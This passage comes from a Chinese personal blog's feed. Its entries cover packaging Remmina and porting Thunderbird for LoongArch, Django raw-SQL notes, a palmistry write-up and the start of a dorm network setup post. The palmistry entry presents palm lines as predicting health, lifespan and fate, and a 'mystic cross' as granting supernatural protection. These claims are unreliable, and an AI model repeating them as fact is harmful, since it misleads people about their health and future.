title="制作deb包"></a>制作deb包</h2><p>编译出软件之后，打deb包是一个很重要的工作</p><p>首先安装<code>dh_make</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装dh_make</span></span><br><span class="line"><span class="built_in">sudo</span> apt install dh-make</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装工具与依赖</span></span><br><span class="line"><span class="built_in">sudo</span> apt install build-essential devscripts</span><br></pre></td></tr></table></figure><p>制作deb包有两种方法：基于源码包制作和基于二进制包制作，我这里选择基于源码制作的方式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Remmina</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为名称里有下划线，所以需要加参数-p</span></span><br><span class="line">dh_make -p remmina_1.4.5 -f ../Remmina_1.4.5.tar.gz </span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240304113151836.png"></p><p>可以发现，源码根目录下多了debian的配置目录</p><p>然后直接打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-buildpackage -b -d -uc -us -nc -a loongarch64</span><br></pre></td></tr></table></figure><p>然后就报错了：</p><p><img src="https://cdn.lmark.cc/img/image-20240304113402409.png"></p><p>根据报错信息可知，是因为这个共享库没有信息，这可能是因为这是本地安装的，而是自己编译或引用的，这需要我们在debian&#x2F;rules文件里添加编译标识：</p><p><img src="https://cdn.lmark.cc/img/image-20240304113611670.png"></p><p>然后再打包，就可以了</p><p><img src="https://cdn.lmark.cc/img/image-20240304113648135.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.orcode.com/question/1032384_kde76f.html">如何测试你的Linux支持SSE2 - 或代码 (orcode.com)</a></p><p><a href="https://gitlab.com/Remmina/Remmina/-/wikis/Compilation/Compile-on-Debian-10-Buster">Compile on Debian 10 Buster · Wiki · Remmina &#x2F; Remmina · GitLab</a></p><p><a href="https://blog.csdn.net/mxcai2005/article/details/111238873?spm=1001.2014.3001.5502">如何制作deb包（基于源码包与二进包）_二进制及库文件打包成deb-CSDN博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Loongarch </tag>
            
            <tag> 编译 </tag>
            
            <tag> Remmina </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>关于Django以前忽略的一些东西</title>
      
      <link href="/archives/a0885322.html"/>
      <url>/archives/a0885322.html</url>
      
        <content type="html"><![CDATA[<h2 id="Django直接使用sql查询"><a href="#Django直接使用sql查询" class="headerlink" title="Django直接使用sql查询"></a>Django直接使用sql查询</h2><p>官方文档：<a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/sql/">执行原生 SQL 查询 | Django 文档 | Django (djangoproject.com)</a></p><h3 id="将查询字段映射为模型字段¶"><a href="#将查询字段映射为模型字段¶" class="headerlink" title="将查询字段映射为模型字段¶"></a>将查询字段映射为模型字段<a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/sql/#mapping-query-fields-to-model-fields">¶</a></h3><p><code>raw()</code> 字段将查询语句中的字段映射至模型中的字段。</p><p>查询语句中的字段排序并不重要。换而言之，以下两种查询是一致的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Person.objects.raw(<span class="string">&#x27;SELECT id, first_name, last_name, birth_date FROM myapp_person&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Person.objects.raw(<span class="string">&#x27;SELECT last_name, birth_date, first_name, id FROM myapp_person&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="直接执行自定义-SQL¶"><a href="#直接执行自定义-SQL¶" class="headerlink" title="直接执行自定义 SQL¶"></a>直接执行自定义 SQL<a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/sql/#executing-custom-sql-directly">¶</a></h3><p>有时候，甚至 <a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/sql/#django.db.models.Manager.raw"><code>Manager.raw()</code></a> 都无法满足需求：你可能要执行不明确映射至模型的查询语句，或者就是直接执行 <code>UPDATE</code>， <code>INSERT</code> 或 <code>DELETE</code> 语句。</p><p>这些情况下，你总是能直接访问数据库，完全绕过模型层。</p><p>对象 <code>django.db.connection</code> 代表默认数据库连接。要使用这个数据库连接，调用 <code>connection.cursor()</code> 来获取一个指针对象。然后，调用 <code>cursor.execute(sql, [params])</code> 来执行该 SQL 和 <code>cursor.fetchone()</code>，或 <code>cursor.fetchall()</code> 获取结果数据。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.db import connection</span><br><span class="line"></span><br><span class="line">def my_custom_sql(self):</span><br><span class="line">    with connection.cursor() as cursor:</span><br><span class="line">        cursor.execute(&quot;UPDATE bar SET foo = 1 WHERE baz = %s&quot;, [self.baz])</span><br><span class="line">        cursor.execute(&quot;SELECT foo FROM bar WHERE baz = %s&quot;, [self.baz])</span><br><span class="line">        row = cursor.fetchone()</span><br><span class="line"></span><br><span class="line">    return row</span><br></pre></td></tr></table></figure><p>要避免 SQL 注入，你绝对不能在 SQL 字符串中用引号包裹 <code>%s</code> 占位符。</p><p>注意，若要在查询中包含文本的百分号，你需要在传入参数使用两个百分号:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(&quot;SELECT foo FROM bar WHERE baz = &#x27;30%&#x27;&quot;)</span><br><span class="line">cursor.execute(&quot;SELECT foo FROM bar WHERE baz = &#x27;30%%&#x27; AND id = %s&quot;, [self.id])</span><br></pre></td></tr></table></figure><p>若你同时使用 <a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/multi-db/">不止一个数据库</a>，你可以使用 <code>django.db.connections</code> 获取指定数据库的连接（和指针）。 <code>django.db.connections</code> 是一个类字典对象，它允许你通过连接别名获取指定连接:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from django.db import connections</span><br><span class="line">with connections[&#x27;my_db_alias&#x27;].cursor() as cursor:</span><br><span class="line">    # Your code here...</span><br></pre></td></tr></table></figure><h2 id="Queryset的缓存行为"><a href="#Queryset的缓存行为" class="headerlink" title="Queryset的缓存行为"></a>Queryset的缓存行为</h2><p>Queryset是有缓存的，但也不是一直都缓存，得遍历过一遍之后才会有缓存。</p><p>官方文档：<a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/queries/#caching-and-querysets">执行查询 | Django 文档 | Django (djangoproject.com)</a></p><h4 id="当-QuerySet-未被缓存时¶"><a href="#当-QuerySet-未被缓存时¶" class="headerlink" title="当 QuerySet 未被缓存时¶"></a>当 <code>QuerySet</code> 未被缓存时<a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/queries/#when-querysets-are-not-cached">¶</a></h4><p>查询结果集并不总是缓存结果。当仅计算查询结果集的 <em>部分</em> 时，会校验缓存，若没有填充缓存，则后续查询返回的项目不会被缓存。特别地说，这意味着使用数组切片或索引的 <a href="https://docs.djangoproject.com/zh-hans/4.1/topics/db/queries/#limiting-querysets">限制查询结果集</a> 不会填充缓存。</p><p>例如，重复的从某个查询结果集对象中取指定索引的对象会每次都查询数据库:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>queryset = Entry.objects.<span class="built_in">all</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(queryset[<span class="number">5</span>]) <span class="comment"># Queries the database</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(queryset[<span class="number">5</span>]) <span class="comment"># Queries the database again</span></span><br></pre></td></tr></table></figure><p>不过，若全部查询结果集已被检出，就会去检查缓存:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>queryset = Entry.objects.<span class="built_in">all</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[entry <span class="keyword">for</span> entry <span class="keyword">in</span> queryset] <span class="comment"># Queries the database</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(queryset[<span class="number">5</span>]) <span class="comment"># Uses cache</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(queryset[<span class="number">5</span>]) <span class="comment"># Uses cache</span></span><br></pre></td></tr></table></figure><h2 id="Django使用test"><a href="#Django使用test" class="headerlink" title="Django使用test"></a>Django使用test</h2><p><a href="https://docs.djangoproject.com/zh-hans/4.1/topics/testing/overview/">编写并运行测试 | Django 文档 | Django (djangoproject.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>记一次手相简单学习</title>
      
      <link href="/archives/b280ab86.html"/>
      <url>/archives/b280ab86.html</url>
      
        <content type="html"><![CDATA[<p>之前上网冲浪，在油管上看到老高的新视频：<a href="https://www.youtube.com/watch?v=CM2i6qD8nk8">最強手相，你的雙手決定你的人生 | 老高與小茉 Mr &amp; Mrs Gao - YouTube</a> 看了下自己的手相，感觉还是不错的，故在此记录一下，以后也能回来看一下。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><h4 id="精彩之處"><a href="#精彩之處" class="headerlink" title="精彩之處"></a>精彩之處</h4><ul><li>💡 手相能揭示人生命運的秘密</li></ul><h4 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h4><ul><li>🌟 人的雙手能反映出個人性格和潛力</li></ul><h4 id="內容"><a href="#內容" class="headerlink" title="內容"></a>內容</h4><ul><li>🔮 手掌的線條和紋路能預測一個人的命運和未來</li><li>🌟 手相學是一門古老的術科，被視為一種神秘的藝術</li><li>🌟 人的手形和手指的長度能反映出個人的性格特徵</li><li>💼 某些手相特徵與事業和財富有關</li><li>🌟 通過觀察手相，我們可以了解一個人的健康狀況和壽命</li><li>🌟 手相學的研究能幫助人們更好地了解自己的潛力和命運</li></ul><h2 id="本人手"><a href="#本人手" class="headerlink" title="本人手"></a>本人手</h2><p><img src="https://cdn.lmark.cc/img/068bca0a1023ac43e8e164b2fe4a300.jpg" alt="068bca0a1023ac43e8e164b2fe4a300"></p><h2 id="如何看手相"><a href="#如何看手相" class="headerlink" title="如何看手相"></a>如何看手相</h2><h3 id="看哪一只手才是对的？"><a href="#看哪一只手才是对的？" class="headerlink" title="看哪一只手才是对的？"></a>看哪一只手才是对的？</h3><p>惯用手的另一只手（我的就是左手）。左手反映的是天命，也就是不需要努力就能得到的；右手是需要努力才能得到的。</p><h3 id="最重要的三根线"><a href="#最重要的三根线" class="headerlink" title="最重要的三根线"></a>最重要的三根线</h3><p><img src="https://cdn.lmark.cc/img/image-20231104164037262.png" alt="image-20231104164037262"></p><p>对应到我的就是：</p><p><img src="https://cdn.lmark.cc/img/image-20231104164334690.png" alt="image-20231104164334690"></p><p>先来看第一条——生命线。</p><h4 id="生命线"><a href="#生命线" class="headerlink" title="生命线"></a>生命线</h4><p>生命线长短和寿命的长短没有直接的关系，它反映的是生命力的强弱。主要看生命线下降的弧度，如果下降太快，说明生命力消耗过快。下降快是如下图所示，没有过食指和中指之间的线。</p><p><img src="https://cdn.lmark.cc/img/image-20231104164705170.png" alt="image-20231104164705170"></p><p>我过了嘿嘿。</p><p>如果没过也不要灰心，看看右手，如果右手好说明通过后天努力是能让生命力获得补充。</p><p>此外，还有内生命线，可能有一条，两条，甚至四条。</p><p><img src="https://cdn.lmark.cc/img/image-20231104165019092.png" alt="image-20231104165019092"></p><p>此外，生命线末端有分叉的的是——<strong>旅行线</strong></p><p><img src="https://cdn.lmark.cc/img/image-20231104165208507.png" alt="image-20231104165208507"></p><p>旅行线我虽然左手没有，但是我右手有嘿嘿，所以只要我努努力，就可以去很远的地方，努努力运气就会好！</p><h4 id="智慧线"><a href="#智慧线" class="headerlink" title="智慧线"></a>智慧线</h4><p>智慧线的长度并不代表智商高低，而是一个人的思考方式和脑回路。</p><p>长短也就代表思考问题的长短，智慧线越短越倾向直觉；长代表深思熟虑，但容易过度思考</p><p>这根线的长短可以用来作为判断一个人的依据，别人长的话就慢慢来讲；如果短的话就快速说结论，快速解决。</p><p>还有就是这条线的形状也很重要，如果比较直，偏向理性思维，如果比较弯，则偏向感性思维。</p><p><img src="https://cdn.lmark.cc/img/image-20231110214738750.png" alt="image-20231110214738750"></p><p>我虽然没撇岔，但是我多一条重智慧线，这意味着我有多重才能</p><p><img src="https://cdn.lmark.cc/img/image-20231110214812019.png" alt="image-20231110214812019"></p><p>关于任性</p><p><img src="https://cdn.lmark.cc/img/image-20231110214929225.png" alt="image-20231110214929225"></p><p><img src="https://cdn.lmark.cc/img/image-20231110214958477.png" alt="image-20231110214958477"></p><p><img src="https://cdn.lmark.cc/img/image-20231110215157914.png" alt="image-20231110215157914"></p><p>我的末端连在一起了，同时也比较弯，而且还多一条，挺好的</p><h4 id="感情线"><a href="#感情线" class="headerlink" title="感情线"></a>感情线</h4><p>感情线的长度非常重要，感情线短的人容易上头，容易大喜大悲；长的人情绪比较稳定</p><p><img src="https://cdn.lmark.cc/img/image-20231110215441639.png" alt="image-20231110215441639"></p><p>感情线正常到中指位置（图中红线），如果快速上扬，也代表这个人容易感情化：</p><p><img src="https://cdn.lmark.cc/img/image-20231110215643327.png" alt="image-20231110215643327"></p><p>下扬的话，说明冷血</p><p><img src="https://cdn.lmark.cc/img/image-20231110215745098.png" alt="image-20231110215745098"></p><p>我的是比较长，所以我思考会比较多，然后同时也是快速上扬的，也容易感情用事</p><p><img src="https://cdn.lmark.cc/img/image-20231110220342388.png" alt="image-20231110220342388"></p><h3 id="更重要的第四条线——命运线，幸运线，成功线"><a href="#更重要的第四条线——命运线，幸运线，成功线" class="headerlink" title="更重要的第四条线——命运线，幸运线，成功线"></a>更重要的第四条线——命运线，幸运线，成功线</h3><p><img src="https://cdn.lmark.cc/img/image-20231110220102094.png" alt="image-20231110220102094"></p><p>一条从手掌中心从下往上穿过的，虽然很重要，但不是每个人都有，而且就算有，也可能断断续续。</p><p>如果没有的，那属于辅助性人格</p><p>从下往上看，代表人生不同的阶段：只有下半段属于早年运气会比较好；只有上半段属于大器晚成型</p><p><img src="https://cdn.lmark.cc/img/image-20231110220747308.png"></p><p>辅助线是在特定时期会遇到贵人。靠近大拇指的是家人，外侧的是外人。</p><h3 id="神秘十字纹"><a href="#神秘十字纹" class="headerlink" title="神秘十字纹"></a>神秘十字纹</h3><p><img src="https://cdn.lmark.cc/img/image-20231110221228614.png" alt="image-20231110221228614"></p><p>在特定地方有一个十字，有神秘十字纹会被神秘力量保佑，遇到灾难也有机会幸存的；而且有这条线的人，吸引力法则会很有效。</p><p>我就有嘿嘿，而且我也信吸引力法则。而且我的直觉通常很准，靠实锤了</p><h3 id="断掌纹"><a href="#断掌纹" class="headerlink" title="断掌纹"></a>断掌纹</h3><p><img src="https://cdn.lmark.cc/img/image-20231110221524644.png" alt="image-20231110221524644"></p><p>特殊掌纹，后面还有其他特殊掌纹我就不一一介绍了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>心诚则灵，不信也没事，图一乐就好，还是得看个人努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 手相 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>为Loongarch移植thunderbird78版本</title>
      
      <link href="/archives/ea66db6.html"/>
      <url>/archives/ea66db6.html</url>
      
        <content type="html"><![CDATA[<h2 id="引言："><a href="#引言：" class="headerlink" title="引言："></a>引言：</h2><p>Mozilla Thunderbird，非正式中文名称为雷鸟，是由Mozilla基金会研发的一款自由及开放源码的跨平台电邮客户端、新闻阅读器、聚合器以及即时通讯软件。此软件预设安装于Ubuntu之上。Thunderbird可用作电邮、新闻组、聚合器或聊天（XMPP、IRC或Twitter）客户端。其预设安装的Lightning扩展则入了个人资讯管理功能。用户若有需要亦可自行安装其他附加元件。</p><h2 id="移植环境"><a href="#移植环境" class="headerlink" title="移植环境"></a>移植环境</h2><p>软件环境：</p><ul><li>操作系统：loongnix-19.0</li></ul><p>硬件环境：</p><ul><li><p>CPU：3C5000 CPU</p></li><li><p>核数：四核</p></li><li><p>内存：8GB以上</p></li><li><p>硬盘：256GB以上</p></li></ul><h2 id="移植准备"><a href="#移植准备" class="headerlink" title="移植准备"></a>移植准备</h2><p>本节操作需要以下依赖:</p><h4 id="1-rust-1-65-0-loongarch64"><a href="#1-rust-1-65-0-loongarch64" class="headerlink" title="1.rust-1.65.0-loongarch64"></a>1.rust-1.65.0-loongarch64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载rustup以及rust相关二进制包</span></span><br><span class="line">export RUSTUP_DIST_SERVER=https://rust-lang.loongnix.cn</span><br><span class="line">export RUSTUP_UPDATE_ROOT=https://rust-lang.loongnix.cn/rustup</span><br><span class="line">curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://rust-lang.loongnix.cn/rustup-init.sh | sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用rustup安装1.65.0版本rust</span></span><br><span class="line">rustup toolchain install 1.65.0</span><br><span class="line">rustup default 1.65.0-loongarch64-unknown-linux-gnu</span><br></pre></td></tr></table></figure><h4 id="2-cbindgen-0-14-3"><a href="#2-cbindgen-0-14-3" class="headerlink" title="2.cbindgen-0.14.3"></a>2.cbindgen-0.14.3</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载旧版本cbindgen</span></span><br><span class="line">sudo apt remove --purge cbindgen</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装0.14.3版本cbindgen</span></span><br><span class="line">cargo install --version 0.14.3 cbindgen</span><br></pre></td></tr></table></figure><h4 id="3-botan"><a href="#3-botan" class="headerlink" title="3.botan"></a>3.botan</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#安装新版本botan</span><br><span class="line">sudo apt install libbotan</span><br></pre></td></tr></table></figure><h2 id="移植步骤："><a href="#移植步骤：" class="headerlink" title="移植步骤："></a>移植步骤：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以下操作均在LoongArch虚拟机上进行</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">准备编译环境:</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sudo</span> apt-get install git mercurial python make autoconf libtool pkg-config</span></span><br><span class="line">sudo apt-get build-dep thunderbird</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译参数</span></span><br><span class="line"> cat &gt; mozconfig &lt;&lt; &quot;EOF&quot;</span><br><span class="line">ac_add_options --disable-necko-wifi</span><br><span class="line">ac_add_options --with-system-libevent</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ac_add_options --with-system-libvpx</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ac_add_options --with-system-nspr</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ac_add_options --with-system-nss</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ac_add_options --with-system-icu</span></span><br><span class="line">ac_add_options --prefix=/usr</span><br><span class="line">ac_add_options --libdir=/usr/lib64</span><br><span class="line">ac_add_options --target=loongarch64-unknown-linux-gnu</span><br><span class="line">ac_add_options --enable-application=comm/mail</span><br><span class="line">ac_add_options --disable-jit</span><br><span class="line">ac_add_options --disable-crashreporter</span><br><span class="line">ac_add_options --disable-updater</span><br><span class="line">ac_add_options --disable-debug</span><br><span class="line">ac_add_options --disable-debug-symbols</span><br><span class="line">ac_add_options --disable-tests</span><br><span class="line">ac_add_options --enable-optimize=-O2</span><br><span class="line">ac_add_options --enable-official-branding</span><br><span class="line">ac_add_options --enable-system-ffi</span><br><span class="line">ac_add_options --enable-system-pixman</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ac_add_options --with-system-jpeg</span></span><br><span class="line">ac_add_options --with-system-png</span><br><span class="line">ac_add_options --with-system-zlib</span><br><span class="line">ac_add_options --without-wasm-sandboxed-libraries</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ac_add_options --with-system-webp</span></span><br><span class="line">ac_add_options --disable-strip</span><br><span class="line">ac_add_options --disable-jemalloc</span><br><span class="line">ac_add_options --disable-install-strip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">克隆仓库并进入源码目录:</span></span><br><span class="line">git clone --depth=1 --branch=1%78.14.0-1_deb10u1 https://salsa.debian.org/mozilla-team/thunderbird.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始编译并静待编译完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择Loongarch为目标架构</span></span><br><span class="line">dpkg-buildpackage -b -d -uc -us -nc -a loongarch64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看编译成果:</span></span><br><span class="line">ls -l ../</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在系统中安装编译好的 thunderbird78 软件:</span></span><br><span class="line">sudo apt install -y  </span><br></pre></td></tr></table></figure><h2 id="测试和验证："><a href="#测试和验证：" class="headerlink" title="测试和验证："></a>测试和验证：</h2><p>完成位于源码 testing 目录下的自带测试用例编译和运行</p><p>注意：需要在编译时加入<code>ac_add_options --enable-debug</code>参数，编译完成的二进制文件才能正常运行测试</p><h3 id="XPCShell"><a href="#XPCShell" class="headerlink" title="XPCShell"></a>XPCShell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在项目根目录下</span></span><br><span class="line">./mach xpcshell-test testing</span><br></pre></td></tr></table></figure><h3 id="Mochitest"><a href="#Mochitest" class="headerlink" title="Mochitest"></a>Mochitest</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mach mochitest testing</span><br></pre></td></tr></table></figure><h3 id="Crashtest"><a href="#Crashtest" class="headerlink" title="Crashtest"></a>Crashtest</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mach crashtest dom/media/tests/crashtests</span><br></pre></td></tr></table></figure><h3 id="GTest"><a href="#GTest" class="headerlink" title="GTest"></a>GTest</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mach gtest testing</span><br></pre></td></tr></table></figure><h3 id="CUTest"><a href="#CUTest" class="headerlink" title="CUTest"></a>CUTest</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mach cppunittest</span><br></pre></td></tr></table></figure><h3 id="Chrome-Tests"><a href="#Chrome-Tests" class="headerlink" title="Chrome Tests"></a>Chrome Tests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mach test toolkit/content/tests/chrome/</span><br></pre></td></tr></table></figure><h2 id="已知问题和限制："><a href="#已知问题和限制：" class="headerlink" title="已知问题和限制："></a>已知问题和限制：</h2><h3 id="移植中可能出现的问题："><a href="#移植中可能出现的问题：" class="headerlink" title="移植中可能出现的问题："></a>移植中可能出现的问题：</h3><p><img src="http://cdn.lmark.cc/img/image-20230818092326617.png"></p><p><img src="http://cdn.lmark.cc/img/image-20230818092354677.png"></p><p><img src="http://cdn.lmark.cc/img/image-20230818092409646.png"></p><p><img src="http://cdn.lmark.cc/img/image-20230818092426168.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Loongarch </tag>
            
            <tag> 编译 </tag>
            
            <tag> thunderbird </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>宿舍网络拓扑介绍（附部分教程）</title>
      
      <link href="/archives/df0f0134.html"/>
      <url>/archives/df0f0134.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>曾经折腾了个K2P的路由器，感觉性能还是差点意思，于是暑假就入手了台J4125小主机，准备好好折腾一下宿舍网络，装一些实用的功能来方便我学习生活。</p><p>现在差不多折腾好了，遂写一篇文章记录一下，我的近乎完美的宿舍网络设计。</p><h2 id="设计理念"><a href="#设计理念" class="headerlink" title="设计理念"></a>设计理念</h2><blockquote><p>性价比+实用+好玩</p></blockquote><p>三个点没有绝对的优先级，主打一个<strong>主观好玩且买得起</strong></p><p>但是现实是<strong>实用的东西比较多</strong></p><p>网络结构总结起来是<strong>“1+1+1”结构</strong>，即一个<strong>硬路由+群晖+小爱</strong></p><p>拓扑图如下：</p><p><img src="https://cdn.lmark.cc/img/image-20230927003842642.png"></p><p>本文主要围绕这张图展开介绍</p><h2 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h2><p>这里我先简单介绍几个最实用的功能和实现的基本部件思路：</p><ul><li>校园内网远程桌面（硬路由端口转发）</li><li>校园网多拨（OP的多拨功能）</li><li>多设备存储&#x2F;备份（NAS+微力存储自动同步）</li><li>自建DNS+去广告（Docker+adguardHome）</li><li>全局爬墙（PassWall 2+旁路由）</li><li>公网访问内网网盘&#x2F;图床&#x2F;RSS阅读器 （CF打洞）</li><li>远程or语音操控开关空调&#x2F;台灯&#x2F;电脑（小爱音箱+终端设备）</li><li>墨水屏实时监控宿舍电量（驱动板自动连接WIFI爬取数据）</li><li>安全的内网穿透访问（zerotier+自建Moon）</li><li>……</li></ul><p>还有很多就不一一列举了，接下来就详细介绍一下各个功能的一些细节，以及使用心得。</p><h2 id="校园网内网远程桌面"><a href="#校园网内网远程桌面" class="headerlink" title="校园网内网远程桌面"></a>校园网内网远程桌面</h2><p>这是我最常使用的功能，实现起来也非常简单。需要升级到企业版Windows，并且开放相应的端口到校园网上就行。</p><p><img src="https://cdn.lmark.cc/img/image-20230927104935677.png"></p><p>但是这样有几个小问题，首先就是校园网IP可能会经常变化，其次校园网账号只有三个设备，很容易被挤掉。</p><p>所以这时候可以在宿舍装一个路由器，这样可以稍微固定校园网IP，同时，使用端口转发可以方便的通过路由器IP访问远程桌面。另外使用openwrt固件的DDNS功能还可以动态绑定域名和IP，这样就不用记路由器IP了</p><p><img 